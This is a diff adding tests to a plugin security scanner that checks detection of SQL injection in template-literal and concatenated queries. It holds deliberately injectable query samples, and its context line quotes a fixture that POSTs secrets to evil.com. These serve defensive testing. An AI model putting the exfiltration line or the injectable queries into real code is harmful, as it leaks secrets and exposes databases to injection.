@@ -154,6 +154,38 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
     );
   });
 
+  it("detects SQL injection pattern (template literal)", () => {
+    const source = `
+const userId = req.body.id;
+const query = \`SELECT * FROM users WHERE id = \${userId};\`;
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "sql-injection" && f.severity === "critical")).toBe(
+      true,
+    );
+  });
+
+  it("ignores clean SQL queries without string concatenation", () => {
+    const source = `
+const userId = req.body.id;
+const query = "SELECT * FROM users WHERE id = ?";
+db.execute(query, [userId]);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "sql-injection")).toBe(false);
+  });
+
+  it("detects SQL injection pattern (string concatenation)", () => {
+    const source = `
+const userId = req.body.id;
+const query = "SELECT * FROM users WHERE id = " + userId + ";";
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "sql-injection" && f.severity === "critical")).toBe(
+      true,
+    );
+  });
+
   it("returns empty array for clean plugin code", () => {
     const source = `
 export function greet(name: string): string {
